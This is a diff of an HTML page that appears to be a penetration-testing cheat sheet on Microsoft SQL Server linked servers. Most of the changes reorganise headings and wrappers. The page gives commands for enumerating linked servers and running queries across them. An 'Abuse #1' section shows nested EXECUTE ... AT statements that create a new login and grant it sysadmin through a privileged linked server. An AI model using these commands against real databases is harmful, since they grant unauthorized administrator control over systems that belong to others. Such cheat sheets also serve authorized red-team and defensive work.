@@ -197,22 +197,28 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="linked-servers">Linked Servers</h3>
-<h4 id="basic-commands">Basic Commands</h4>
+<h3 id="basic-commands">Basic Commands</h3>
 <p><small><em>Hint: Use double <code>''</code> to escape <code>'</code> in mssql</em></small></p>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Show current server
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">servername</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Show linked servers
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">srvname</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sysservers</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><h4 id="execute-query-between-linked-servers">Execute Query between Linked Servers</h4>
+</span></span></span></code></pre></div></div>
+<h3 id="execute-query-between-linked-servers">Execute Query between Linked Servers</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Execute query from current server to linked server
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">EXECUTE</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;select @@version;&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;</span><span class="n">LINKED_SERVER</span><span class="o">&gt;</span><span class="p">];</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Execute query from linked server to current server
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">EXECUTE</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;EXECUTE (&#39;&#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &#39;&#39;&#39;&#39;SERVER&#39;&#39;&#39;&#39;);&#39;&#39;) at [&lt;CURRENT_SERVER&gt;]&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;</span><span class="n">LINKED_SERVER</span><span class="o">&gt;</span><span class="p">];</span><span class="w">
-</span></span></span></code></pre></div><h3 id="abuse-1-create-admin-user-from-privilege-linked-server">Abuse #1: Create Admin User from Privilege Linked Server</h3>
+</span></span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="abuse-1-create-admin-user-from-privilege-linked-server">Abuse #1: Create Admin User from Privilege Linked Server</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="nf">EXECUTE</span><span class="p">(</span><span class="s1">&#39;EXECUTE(&#39;&#39;CREATE LOGIN &lt;USER&gt; WITH PASSWORD = &#39;&#39;&#39;&#39;&lt;PASSWORD&gt;&#39;&#39;&#39;&#39;;&#39;&#39;) AT [&lt;CURRENT_SERVER&gt;]&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">AT</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;</span><span class="n">LINKED_SERVER</span><span class="o">&gt;</span><span class="p">]</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="nf">EXECUTE</span><span class="p">(</span><span class="s1">&#39;EXECUTE(&#39;&#39;EXEC sp_addsrvrolemember &#39;&#39;&#39;&#39;&lt;USER&gt;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;sysadmin&#39;&#39;&#39;&#39;&#39;&#39;) AT [&lt;CURRENT_SERVER&gt;]&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">AT</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;</span><span class="n">LINKED_SERVER</span><span class="o">&gt;</span><span class="p">]</span><span class="w">
-</span></span></span></code></pre></div></div></div>
+</span></span></span></code></pre></div></div></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
